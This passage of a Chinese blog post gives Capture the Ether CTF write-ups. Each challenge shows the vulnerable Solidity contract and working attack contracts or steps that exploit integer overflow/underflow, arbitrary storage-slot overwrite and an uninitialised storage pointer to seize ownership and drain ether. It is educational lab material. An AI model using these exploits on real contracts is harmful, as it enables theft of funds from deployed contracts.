+<p>故只需要answer&#x3D;0，并等待最新的区块比调用函数时的区块大256时即可。</p>
+<h2 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h2><h3 id="Token-sale"><a href="#Token-sale" class="headerlink" title="Token sale"></a><a target="_blank" rel="noopener" href="https://capturetheether.com/challenges/math/token-sale/">Token sale</a></h3><ul>
+<li><p>题目</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract TokenSaleChallenge &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public balanceOf;</span><br><span class="line">    uint256 constant PRICE_PER_TOKEN = 1 ether;</span><br><span class="line"></span><br><span class="line">    function TokenSaleChallenge(address _player) public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &lt; 1 ether;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function buy(uint256 numTokens) public payable &#123;</span><br><span class="line">        require(msg.value == numTokens * PRICE_PER_TOKEN);</span><br><span class="line"></span><br><span class="line">        balanceOf[msg.sender] += numTokens;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function sell(uint256 numTokens) public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= numTokens);</span><br><span class="line"></span><br><span class="line">        balanceOf[msg.sender] -= numTokens;</span><br><span class="line">        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>Write-Up</p>
+</li>
+</ul>
+<p>没有溢出保护，构造溢出。</p>
+<p>思路：构造溢出有两种思路。</p>
+<ol>
+<li><p>第一种思路是希望在<code>sell(uint256 numTokens)</code>中构造溢出，即思路是卖比实际价值更少的代币，获得更多的以太。</p>
+<p>这里能溢出的地方只有</p>
+<blockquote>
+<p>balanceOf[msg.sender] -&#x3D; numTokens; </p>
+<p>和</p>
+<p> numTokens * PRICE_PER_TOKEN</p>
+</blockquote>
+<p>若构造减法溢出，即希望<code>balanceOf[msg.sender]</code>被负溢出，成为一个极大的值。但是由于<code>require(balanceOf[msg.sender] &gt;= numTokens);</code>，该溢出无法做到。</p>
+<p>若构造乘法溢出，即希望<code>numTokens * PRICE_PER_TOKEN</code>溢出，得到一个极小的值。这样反而得到的以太变少了。</p>
+<p>故不在<code>sell(uint256 numTokens)</code>中构造溢出。</p>
+</li>
+<li><p>第一种是在<code>buy(uint256 numTokens)</code>中构造溢出。</p>
+<p>这里同样有两处可以溢出。</p>
+<blockquote>
+<p>numTokens * PRICE_PER_TOKEN</p>
+<p>和</p>
+<p>balanceOf[msg.sender] +&#x3D; numTokens;</p>
+</blockquote>
+<p>若构造<code>balanceOf[msg.sender] += numTokens;</code>的溢出，仍然无意义。</p>
+<p>正确溢出构造：构造<code>buy(uint256 numTokens)</code>中的<code>numTokens * PRICE_PER_TOKEN</code>溢出。</p>
+<p>即构造大数<code>numToken。</code>使得<code>numTokens * PRICE_PER_TOKEN</code>溢出，得到一个极小值。最终的结果是用极少量的钱购买了大量代币。</p>
+<p>本次攻击合约如下：</p>
+</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract TokenSaleChallenge &#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract exploit &#123;</span><br><span class="line">    address addrContractToken;</span><br><span class="line">    uint256 constant PRICE_PER_TOKEN = 1 ether;</span><br><span class="line"></span><br><span class="line">    function attackerBuy(address addr) public payable &#123;</span><br><span class="line"></span><br><span class="line">        addrContractToken = addr;</span><br><span class="line"></span><br><span class="line">        uint256 makeOverflow = 2**256-1;</span><br><span class="line">        uint256 overflowNumTokens = makeOverflow / PRICE_PER_TOKEN + 1;</span><br><span class="line"></span><br><span class="line">        TokenSaleChallenge contractToken = TokenSaleChallenge(addrContractToken);</span><br><span class="line">        contractToken.buy.value(415992086870360064)(overflowNumTokens);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attackerSell()public&#123;</span><br><span class="line">        TokenSaleChallenge contractToken = TokenSaleChallenge(addrContractToken);</span><br><span class="line">        contractToken.sell(1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function () public payable&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​        攻击步骤：</p>
+<ol>
+<li><p>执行<code>attackerBuy(address addr)</code>，并附带415992086870360064 Wei</p>
+<p><code>addr</code>是挑战合约的地址，<code>overflowNumTokens</code>即我们构造的大数。它和<code>PRICE_PER_TOKEN</code>相乘后会溢出，得到一个不到1 ether 的值。该值经过事先计算，为415992086870360064。</p>
+</li>
+<li><p>执行attackerSell()</p>
+</li>
+</ol>
+<h3 id="Token-whale"><a href="#Token-whale" class="headerlink" title="Token whale"></a><a target="_blank" rel="noopener" href="https://capturetheether.com/challenges/math/token-whale/">Token whale</a></h3><ul>
+<li>题目</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract TokenWhaleChallenge &#123;</span><br><span class="line">    address player;</span><br><span class="line"></span><br><span class="line">    uint256 public totalSupply;</span><br><span class="line">    mapping(address =&gt; uint256) public balanceOf;</span><br><span class="line">    mapping(address =&gt; mapping(address =&gt; uint256)) public allowance;</span><br><span class="line"></span><br><span class="line">    string public name = &quot;Simple ERC20 Token&quot;;</span><br><span class="line">    string public symbol = &quot;SET&quot;;</span><br><span class="line">    uint8 public decimals = 18;</span><br><span class="line"></span><br><span class="line">    function TokenWhaleChallenge(address _player) public &#123;</span><br><span class="line">        player = _player;</span><br><span class="line">        totalSupply = 1000;</span><br><span class="line">        balanceOf[player] = 1000;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return balanceOf[player] &gt;= 1000000;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint256 value);</span><br><span class="line"></span><br><span class="line">    function _transfer(address to, uint256 value) internal &#123;</span><br><span class="line">        balanceOf[msg.sender] -= value;</span><br><span class="line">        balanceOf[to] += value;</span><br><span class="line"></span><br><span class="line">        emit Transfer(msg.sender, to, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 value) public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= value);</span><br><span class="line">        require(balanceOf[to] + value &gt;= balanceOf[to]);</span><br><span class="line"></span><br><span class="line">        _transfer(to, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event Approval(address indexed owner, address indexed spender, uint256 value);</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 value) public &#123;</span><br><span class="line">        allowance[msg.sender][spender] = value;</span><br><span class="line">        emit Approval(msg.sender, spender, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferFrom(address from, address to, uint256 value) public &#123;</span><br><span class="line">        require(balanceOf[from] &gt;= value);</span><br><span class="line">        require(balanceOf[to] + value &gt;= balanceOf[to]);</span><br><span class="line">        require(allowance[from][msg.sender] &gt;= value);</span><br><span class="line"></span><br><span class="line">        allowance[from][msg.sender] -= value;</span><br><span class="line">        _transfer(to, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>Write-Up</p>
+<p>这个合约有一个最大的漏洞在<code>transferFrom(address from, address to, uint256 value)</code>中，这个函数只对from地址做了值上的判断，但是实际的转账是调用了<code>_transfer(address to, uint256 value)，如下：</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function _transfer(address to, uint256 value) internal &#123;</span><br><span class="line">        balanceOf[msg.sender] -= value;</span><br><span class="line">        balanceOf[to] += value;</span><br><span class="line"></span><br><span class="line">        emit Transfer(msg.sender, to, value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>实际转账是从<code>msg.sender</code>转到<code>to</code>。这样可以实现<code>msg.sender</code>的余额小于<code>value</code>仍然可以做减法，造成负溢出。</p>
+<p>我们需要编写的只有一个工具合约，用来作为接收代币的工具人。工具合约如下，我们把部署后该合约的地址称作<code>toolContractAddr</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract TokenWhaleChallenge &#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract toolContract&#123;</span><br><span class="line">    function approve(address player,address addrContractToken, uint256 value)&#123;</span><br><span class="line">        TokenWhaleChallenge contractToken = TokenWhaleChallenge(addrContractToken);</span><br><span class="line">        contractToken.approve(player,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>接下来就是人工操作进行攻击。</p>
+<ol>
+<li><p>向<code>TokenWhaleChallenge</code>合约发送<code>approve(toolContractAddr，1000)</code></p>
+<p>[为了许可向工具合约转移所有已有代币。数量至少1000。]</p>
+</li>
+<li><p>向<code>toolContract</code>合约发送<code>approve(自己的地址,挑战合约地址,1)</code></p>
+<p>[为了许可后续负溢出操作的转账行为，数量随便多少。最小只需要允许给自己的地址转一个代币即可做到负溢出。]</p>
+</li>
+<li><p>向<code>TokenWhaleChallenge</code>合约发送<code>transfer(toolContractAddr，1000)</code></p>
+<p>[把所有代币转移到工具合约处。为后续的负溢出操作做准备。此时自己的地址已经没有代币了。]</p>
+</li>
+<li><p>向<code>TokenWhaleChallenge</code>合约发送<code>transferfrom(toolContractAddr,toolContractAddr,1)</code></p>
+<p>[负溢出操作。]</p>
+<p>该操作的具体原理如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">function transferFrom(toolContractAddr,  toolContractAddr, 1) public &#123;</span><br><span class="line"></span><br><span class="line">		//toolContractAddr的余额为1000，大于1。通过。</span><br><span class="line">        require(balanceOf[from] &gt;= value);</span><br><span class="line">        </span><br><span class="line">        //toolContractAddr的余额 1000 + 1 = 1001，没有正溢出。通过。</span><br><span class="line">        require(balanceOf[to] + value &gt;= balanceOf[to]);</span><br><span class="line">        </span><br><span class="line">        //经过第2步allowance[from][msg.sender]为1，大于等于1.通过。</span><br><span class="line">        require(allowance[from][msg.sender] &gt;= value);</span><br><span class="line"></span><br><span class="line">        allowance[from][msg.sender] -= value;</span><br><span class="line">        _transfer(to, value);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">function _transfer(toolContractAddr, 1) internal &#123;</span><br><span class="line">		// balanceOf[msg.sender]此时由于第3步的转账，已经等于0，减一之后负溢出。</span><br><span class="line">        balanceOf[msg.sender] -= value;</span><br><span class="line">        </span><br><span class="line">        balanceOf[to] += value;</span><br><span class="line"></span><br><span class="line">        emit Transfer(msg.sender, to, value);</span><br><span class="line">    &#125;  </span><br></pre></td></tr></table></figure>
+
+<p>当然第3步也可以不把所有代币转完，只要第4步多转点就行了。但是要注意工具合约的余额是否大于负溢出所需要的数量。第1,2步也需要改变数量。</p>
+</li>
+</ol>
+</li>
+</ul>
+<h3 id="Retirement-fund"><a href="#Retirement-fund" class="headerlink" title="Retirement fund"></a><a target="_blank" rel="noopener" href="https://capturetheether.com/challenges/math/retirement-fund/">Retirement fund</a></h3><h3 id="Mapping"><a href="#Mapping" class="headerlink" title="Mapping"></a><a target="_blank" rel="noopener" href="https://capturetheether.com/challenges/math/mapping/">Mapping</a></h3><ul>
+<li>题目</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract MappingChallenge &#123;</span><br><span class="line">    bool public isComplete;</span><br><span class="line">    uint256[] map;</span><br><span class="line"></span><br><span class="line">    function set(uint256 key, uint256 value) public &#123;</span><br><span class="line">        // Expand dynamic array as needed</span><br><span class="line">        if (map.length &lt;= key) &#123;</span><br><span class="line">            map.length = key + 1;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        map[key] = value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get(uint256 key) public view returns (uint256) &#123;</span><br><span class="line">        return map[key];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>Write-Up</p>
+<p>这道题考察的知识点是 <strong>solidity底层如何存储storage变量</strong> 的，简单来说storage是一系列插槽，插槽总长度是2^256，每个插槽大小是256位，所以可以做到将一个变量把另外一个变量覆盖了的情况。详见：<a target="_blank" rel="noopener" href="https://solidity-cn.readthedocs.io/zh/develop/miscellaneous.html">https://solidity-cn.readthedocs.io/zh/develop/miscellaneous.html</a></p>
+<p>思路是利用<code>map</code>变量精准覆盖<code>isComplete</code>变量，覆盖为1。</p>
+<p>先上攻击代码，如下：</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract MappingChallenge &#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract exploit&#123;</span><br><span class="line">    function attacker(address addr) public&#123;</span><br><span class="line">        bytes32 map_store_storage = keccak256(bytes32(1));</span><br><span class="line">        uint256 go_to_0_storage = 2**256-1-uint256(map_store_storage)+1;</span><br><span class="line">        MappingChallenge challeng_contract = MappingChallenge(addr);</span><br><span class="line">        challeng_contract.set(go_to_0_storage,1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>比较重要的几点如下：</p>
+<ol>
+<li><p>如何得到<code>keccak256(bytes32(1))</code>中的<code>1</code>的？</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">contract MappingChallenge &#123;</span><br><span class="line">    bool public isComplete;</span><br><span class="line">    uint256[] map;</span><br><span class="line">    // 按照storage定义的顺序，</span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="Donation"><a href="#Donation" class="headerlink" title="Donation"></a><a target="_blank" rel="noopener" href="https://capturetheether.com/challenges/math/donation/">Donation</a></h3><ul>
+<li>题目</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract DonationChallenge &#123;</span><br><span class="line">    struct Donation &#123;</span><br><span class="line">        uint256 timestamp;</span><br><span class="line">        uint256 etherAmount;</span><br><span class="line">    &#125;</span><br><span class="line">    Donation[] public donations;</span><br><span class="line"></span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    function DonationChallenge() public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">        </span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function donate(uint256 etherAmount) public payable &#123;</span><br><span class="line">        // amount is in ether, but msg.value is in wei</span><br><span class="line">        uint256 scale = 10**18 * 1 ether;</span><br><span class="line">        require(msg.value == etherAmount / scale);</span><br><span class="line"></span><br><span class="line">        Donation donation;</span><br><span class="line">        donation.timestamp = now;</span><br><span class="line">        donation.etherAmount = etherAmount;</span><br><span class="line"></span><br><span class="line">        donations.push(donation);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        </span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Write-Up</li>
+</ul>
+<p>本题的缺陷在于：<code>Solidity ^0.4.0</code>版本，<strong>Unintialised Storage Pointers（未初始化的存储指针），也叫未初始化的 storage 指针</strong>漏洞。</p>
+<p>EVM中会将数据存储为 storage 或 memory ，在函数中局部变量的默认类型取决于它们本身的类型，未进行初始化的 storage 变量，会指向合约中的其他变量，从而改变其他变量的值，常见的场景就是指向状态变量，改变状态变量的值，导致漏洞的产生。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function donate(uint256 etherAmount) public payable &#123;</span><br><span class="line">        // amount is in ether, but msg.value is in wei</span><br><span class="line">        uint256 scale = 10**18 * 1 ether;</span><br><span class="line">        require(msg.value == etherAmount / scale);</span><br><span class="line">        </span><br><span class="line">		//漏洞所在，实际是指向了storage。</span><br><span class="line">        Donation donation;</span><br><span class="line">        </span><br><span class="line">        //改变donation的值，实际是改变了storage中其他状态变量的值。</span><br><span class="line">        donation.timestamp = now;//改变了storage插槽0的值</span><br><span class="line">        donation.etherAmount = etherAmount;//改变了storage插槽1的值</span><br><span class="line">        ...</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<p>具体查看网址：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/154407">https://www.anquanke.com/post/id/154407</a></p>
+<p>所以攻击的思路就是通过<code>donation</code>的漏洞 覆盖 <code>owner</code>变量，改变成为自己的地址即可。</p>
+<p>攻击合约代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract DonationChallenge &#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract exploit&#123;</span><br><span class="line">    uint256 value;</span><br><span class="line"></span><br><span class="line">    function computeValue()public returns (uint256)&#123;</span><br><span class="line">        uint256 scale = 10**18 * 1 ether;</span><br><span class="line">        value = uint256(address(this))/scale;</span><br><span class="line">        return value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attacter(address addr)public payable&#123;</span><br><span class="line">        </span><br><span class="line">        DonationChallenge challengeContract = DonationChallenge(addr);</span><br><span class="line">        //实际挑战合约会执行donation.etherAmount = uint256(address(this));，即把owner变为uint256(address(this))</span><br><span class="line">        challengeContract.donate.value(value)(uint256(address(this)));</span><br><span class="line">        challengeContract.withdraw();</span><br><span class="line"></span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function()payable&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>疑问：</p>
+<p>攻击合约中<code>function computeValue()</code>应该返回value值的，但是remix并不返回任何东西。虽然这个问题不影响攻击合约的使用，实际上uint256 value变量也做了变化。只是感到很奇怪，这是remix的bug吗？尝试用javaVM部署，发现有返回值，但是在ropsten测试网上就没有返回值，可以深入研究。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/03/17/blockchain/" rel="prev" title="">
+      <i class="fa fa-chevron-left"></i> 
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/03/17/web/" rel="next" title="">
+       <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          المحتويات
+        </li>
+        <li class="sidebar-nav-overview">
+          عام
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%98%E6%96%B9CTF%E9%A2%98-write-up"><span class="nav-number">1.</span> <span class="nav-text">区块链官方CTF题 write-up</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Warmup"><span class="nav-number">1.1.</span> <span class="nav-text">Warmup</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Deploy-a-contract"><span class="nav-number">1.1.1.</span> <span class="nav-text">Deploy a contract</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Call-me"><span class="nav-number">1.1.2.</span> <span class="nav-text">Call me</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Choose-a-nickname"><span class="nav-number">1.1.3.</span> <span class="nav-text">Choose a nickname</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Lotteries"><span class="nav-number">1.2.</span> <span class="nav-text">Lotteries</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Guess-the-number"><span class="nav-number">1.2.1.</span> <span class="nav-text">Guess the number</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Guess-the-secret-number"><span class="nav-number">1.2.2.</span> <span class="nav-text">Guess the secret number</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Guess-the-random-number"><span class="nav-number">1.2.3.</span> <span class="nav-text">Guess the random number</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Guess-the-new-number"><span class="nav-number">1.2.4.</span> <span class="nav-text">Guess the new number</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Predict-the-future"><span class="nav-number">1.2.5.</span> <span class="nav-text">Predict the future</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Predict-the-block-hash"><span class="nav-number">1.2.6.</span> <span class="nav-text">Predict the block hash</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Math"><span class="nav-number">1.3.</span> <span class="nav-text">Math</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Token-sale"><span class="nav-number">1.3.1.</span> <span class="nav-text">Token sale</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Token-whale"><span class="nav-number">1.3.2.</span> <span class="nav-text">Token whale</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Retirement-fund"><span class="nav-number">1.3.3.</span> <span class="nav-text">Retirement 